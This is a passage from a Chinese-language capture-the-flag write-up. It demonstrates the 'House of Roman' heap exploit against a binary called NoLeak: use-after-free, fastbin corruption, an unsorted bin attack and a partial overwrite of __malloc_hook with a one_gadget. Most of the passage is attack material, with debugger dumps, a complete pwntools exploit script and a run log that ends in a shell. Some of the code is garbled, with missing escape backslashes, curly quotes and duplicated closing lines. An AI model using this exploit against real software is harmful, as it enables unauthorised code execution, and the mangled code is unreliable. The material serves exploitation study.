    0x7ffff7dd3aed: 0xfff7dd2260000000 0x000000000000007f     # malloc_hook - 0x23 + 0x8 处为0x71，绕过fastbin大小检查
    0x7ffff7dd3afd: 0xfff7a953f0000000 0xfff7a94fd000007f
此时fastbin的结构为：[](https://p5.ssl.qhimg.com/t0105eb7d7bfb374bb1.png)
三次分配得到对 **malloc_hook** 的修改权限
    C(0x68,'f'*0x68)
    C(0x68,'g'*0x8)
    C(0x68,'h'*0x8)
再次释放C块，利用 **UAF** 修改 **C- >fd = NULL** 修复fastbin，否则再次分配堆块的时候会报错
    D(2)
    U(2,8,p64(0))
接下来就是 **unsorted bin attack** ，D一直在unsorted bin中，利用UAF修改 **D- >bk**低3字节，使之指向
**malloc_hook – 0x10** ，再次分配0xd0的块使D脱链触发unsorted bin
attack，从而在malloc_hook处写入main_arena的地址
    U(3,0xa,'asasasas'+__malloc_hook)
    C(0xc8,'')
    gef➤  p &__malloc_hook
    $2 = ( *) 0x7ffff7dd3b10 
    gef➤  x/10xg 0x7ffff7dd3b10
    0x7ffff7dd3b10 : 0x00007ffff7dd3b78 0x0000000000000000
    0x7ffff7dd3b20: 0x0000000000000000 0x0000000000000000
修改malloc_hook低3字节指向 **one_gadget** ，连续两次释放A块（double free）触发
**malloc_printerr** 进而触发malloc，最终getshell。
    one4 = 'xf4xf9xaf'
    U(8,0×16,’a’*0x13+one4)
    D(0)
    D(0)
    p.interactive()
    qts@qts-PC:~/ctf/NoLeak$ ./exp.py
    [+] Starting local process './NoLeak': pid 13358
    [*] '/home/qts/ctf/NoLeak/NoLeak'
        Arch:     amd64-64-little
        RELRO:    Full RELRO
        Stack:    Canary found
        NX:       NX disabled
        PIE:      No PIE (0x400000)
        RWX:      Has RWX segments
    malloc_hook get !
    [*] Switching to interactive mode
    *** Error in `./NoLeak': double free or corruption (fasttop): 0x0000000000602010 ***
    $ whoami
    qts
    $
以上为关闭ASLR的调试结果
## 总结
**House of Roman** 仅需 **UAF** 和 **分配任意大小的堆块** 就可以getshell。最具技巧的部分还是 **局部地址写**
，之所以这样是应为ASLR本身并不能完全随机化，可以修改部分位绕过ASLR。
有不当之处请大家指正。
## 参考
[__](https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc)
## 利用脚本
    #!/usr/bin/env python2.7
    from pwn import *
    import pwnlib
    #p = process('./NoLeak',env={"LD_PRELOAD":"./libc-2.24.so"})
    context.terminal = ['gnome-terminal','-x','sh','-c']
    #libc = ELF('libc-2.23.so')
    p = process('./NoLeak',env={"LD_PRELOAD":"./libc-2.23.so"})
    #p = process('./NoLeak')i
    elf = ELF('NoLeak')
    def C(size,data):
        p.recvuntil('Your choice :')
        p.sendline(str(1))
        p.recvuntil('Size: ')
        p.sendline(str(size))
        p.recvuntil('Data: ',timeout=1)
        p.sendline(data)
    def D(index):
        p.recvuntil('Your choice :',timeout=1)
        p.sendline(str(2))
        p.recvuntil('Index: ')
        p.sendline(str(index))
    def U(index,size,data):
        p.recvuntil('Your choice :',timeout=1)
        p.sendline(str(3))
        p.recvuntil('Index: ',timeout=1)
        p.sendline(str(index))
        p.recvuntil('Size: ',timeout=1)
        p.sendline(str(size))
        p.recvuntil('Data: ')
        p.sendline(data)
    def g():
        pwnlib.gdb.attach(p)
        raw_input()
    __malloc_hook = 'x00x3b'
    __malloc_hook_up = 'xedx3a'        # beg for lucky!!
    C(0x10,'a'*0x10)                     #0
    C(0xc8,'b'*0x60+p64(0)+p64(0x61))    #1
    C(0x68,'c'*0x68)                     #2
    C(0Xc8,'d'*0x68)                     #3
    C(0X68,'d'*0x68)                     #4
    D(1)
    D(3)
    C(0xc8,'')                           #5 get the address of main_arena
    D(2)
    D(4)
    U(4,1,'x20')                        # fake fastbin chain
    U(0,0x19,'e'*0x10+p64(0)+'x71')
    U(1,0x2,__malloc_hook_up)
    C(0x68,'f'*0x68)                     #6
    C(0x68,'g'*0x8)                      #7
    C(0x68,'h'*0x8)                      #8 get the space over malloc_hook
    print "malloc_hook get ! "
    D(2)                                 # link into fastbin
    U(2,8,p64(0))                        # fix fastbin
    U(3,0xa,'asasasas'+__malloc_hook)
    C(0xc8,'')                           #9
    one4 = 'xf4xf9xaf'
    D(0)
    D(0)
    p.interactive()
    D(0)
    D(0)
    p.interactive()